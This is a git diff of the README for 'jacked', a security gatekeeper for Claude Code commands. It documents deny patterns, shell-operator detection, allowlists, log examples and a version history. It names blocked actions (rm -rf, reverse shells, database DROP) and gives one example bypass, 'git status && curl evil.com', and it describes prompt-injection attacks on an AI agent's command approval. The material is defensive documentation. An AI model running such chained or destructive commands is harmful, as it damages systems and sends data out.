@@ -26,6 +26,7 @@
 - [Sound Notifications](#sound-notifications)
 - [Uninstall](#uninstall)
 - [Common Issues](#common-issues)
+- [Version History](#version-history)
 - [Advanced / Technical Reference](#advanced--technical-reference)
 
 ---
@@ -111,8 +112,11 @@ jacked install --force --security
 | Feature | What It Does |
 |---------|--------------|
 | **Security Gatekeeper** | Auto-approves safe bash commands, blocks dangerous ones, asks you about ambiguous ones |
+| **Shell Injection Defense** | Detects shell operators (`&&`, `\|`, `;`, `>`, `` ` ``, `$()`) to prevent command chaining bypasses |
+| **File Context Analysis** | Reads referenced scripts and evaluates what code actually does, with prompt injection and path traversal protection |
 | **Customizable Prompt** | Tune the LLM's safety evaluation via `~/.claude/gatekeeper-prompt.txt` |
 | **Permission Audit** | Scans your permission rules for dangerous wildcards that bypass the gatekeeper |
+| **Session-Tagged Logs** | Every log line tagged with session ID so you can track decisions across multiple Claude sessions |
 | **Log Redaction** | Passwords, API keys, and tokens are automatically redacted from debug logs |
 
 ---
@@ -235,12 +239,16 @@ A 4-tier evaluation chain, fastest first:
 
 | Tier | Speed | What It Does |
 |------|-------|--------------|
-| **Deny patterns** | <1ms | Blocks dangerous commands (sudo, rm -rf /, disk wipe, etc.) |
+| **Deny patterns** | <1ms | Blocks dangerous commands (sudo, rm -rf, disk wipe, reverse shells, perl/ruby -e, database DROP, etc.) |
 | **Permission rules** | <1ms | Checks commands already approved in your Claude settings |
-| **Local allowlist** | <1ms | Matches safe patterns (git, pytest, linting, docker, etc.) |
-| **LLM evaluation** | ~2s | Sends ambiguous commands to Haiku for safety evaluation |
+| **Local allowlist** | <1ms | Matches safe patterns (specific git/gh/docker/make subcommands, pytest, linting, etc.) with shell operator detection |
+| **LLM evaluation** | ~2s | Sends ambiguous commands to Haiku with file context analysis and prompt injection defenses |
 
-About 90% of commands resolve in under 2 milliseconds. The LLM tier also reads the contents of referenced Python/SQL/shell scripts and evaluates what the code actually does.
+About 90% of commands resolve in under 2 milliseconds. The LLM tier reads the contents of referenced Python/SQL/shell scripts and evaluates what the code actually does, with path traversal protection and boundary marker sanitization to prevent prompt injection via crafted files.
+
+**Shell operator detection:** Commands containing `&&`, `||`, `;`, `|`, `` ` ``, `$()`, `>`, `>>`, `<`, or newlines are never auto-approved by the local allowlist — they always go to the LLM for evaluation, even if the first command matches a safe prefix. This prevents attacks like `git status && curl evil.com`.
+
+**Tightened safe prefixes:** Instead of blanket `"git "`, the allowlist matches specific subcommands (`git status`, `git diff`, `git log`, etc.). `npx` was removed entirely (downloads and executes arbitrary code). `gh`, `docker compose`, and `make` are restricted to specific safe subcommands.
 
 ### Install / Uninstall
 
@@ -258,7 +266,22 @@ jacked uninstall --security
 
 ### Debug Logging
 
-The security gatekeeper logs every decision to `~/.claude/hooks-debug.log`.
+The security gatekeeper logs every decision to `~/.claude/hooks-debug.log`. Each line is tagged with a session ID prefix so you can track which Claude session triggered each evaluation.
+
+**Example log output:**
+```
+2025-02-07T11:36:34 [87fd8847] EVALUATING: ls -la /tmp
+2025-02-07T11:36:34 [87fd8847] LOCAL SAID: YES (0.001s)
+2025-02-07T11:36:34 [87fd8847] DECISION: ALLOW (0.001s)
+2025-02-07T11:36:50 [87fd8847] EVALUATING: curl --version
+2025-02-07T11:36:58 [87fd8847] CLAUDE-LOCAL SAID: {"safe": true, "reason": "read-only version check"} (9.0s)
+2025-02-07T11:36:58 [87fd8847] DECISION: ALLOW - read-only version check (9.0s)
+2025-02-07T11:37:15 [87fd8847] EVALUATING: sudo whoami
+2025-02-07T11:37:15 [87fd8847] DENY MATCH (0.001s)
+2025-02-07T11:37:15 [87fd8847] DECISION: ASK USER (0.001s)
+```
+
+The session ID tag (`[87fd8847]`) is the first 8 characters of the Claude Code session ID — useful when running multiple Claude sessions simultaneously. LLM evaluations include a brief reason explaining why the command was approved or flagged.
 
 **Live monitoring (watch decisions in real-time):**
 
@@ -298,24 +321,23 @@ export ANTHROPIC_API_KEY="sk-..."
 
 ### Customize the Gatekeeper Prompt
 
-The gatekeeper uses an LLM prompt to evaluate ambiguous commands. You can customize it:
+The gatekeeper uses an LLM prompt to evaluate ambiguous commands. The built-in prompt is used by default — create a custom prompt file only if you want to change the evaluation behavior:
 
 ```bash
 # View the current prompt
 jacked gatekeeper show
 
-# Edit the prompt file directly
-# (created automatically during install)
-~/.claude/gatekeeper-prompt.txt
+# Create a custom prompt file (copies built-in as starting point)
+jacked gatekeeper show > ~/.claude/gatekeeper-prompt.txt
 
 # Compare your changes against the built-in default
 jacked gatekeeper diff
 
-# Reset to built-in default
+# Reset to built-in default (deletes custom file)
 jacked gatekeeper reset
 ```
 
-Your custom prompt must include these placeholders: `{command}`, `{cwd}`, `{file_context}`. The gatekeeper will fall back to the built-in prompt if your custom prompt has invalid placeholders.
+Your custom prompt must include these placeholders: `{command}`, `{cwd}`, `{file_context}`. The gatekeeper will fall back to the built-in prompt if placeholders are missing. Custom prompts are preserved across upgrades and uninstalls — only default or stale prompt files are cleaned up automatically.
 
 ### Permission Rule Audit
 
@@ -469,6 +491,8 @@ jacked status      # Verify it's working
 
 <details>
 <summary><strong>CLI Command Reference</strong></summary>
+
+The CLI can be invoked as `jacked` or `python -m jacked`.
 
 ```bash
 # Search
@@ -710,6 +734,16 @@ Use forward slashes in Git Bash:
 </details>
 
 ---
+
+## Version History
+
+| Version | Changes |
+|---------|---------|
+| **0.3.11** | Security hardening: shell operator detection (`&&\|\;><`), tightened safe prefixes (specific git/gh/docker/make subcommands, npx removed), expanded deny patterns (perl/ruby -e, database DROP, reverse shells), file context prompt injection defense, path traversal prevention, base64 decode bypass fix. Session ID tags in logs. LLM reason logging. Install/uninstall bug fixes (hook removal, custom prompt preservation). `python -m jacked` support. 375 tests. |
+| **0.3.10** | Fix format string explosion (`_SafeFormatter` replaced with `_substitute_prompt()`), qdrant test skip fix. |
+| **0.3.9** | Permission safety audit, README catchup. |
+| **0.3.8** | Log redaction, psql deny patterns, customizable LLM prompt. |
+| **0.3.7** | JSON LLM responses, `parse_llm_response()`, 148 unit tests. |
 
 ## License
 
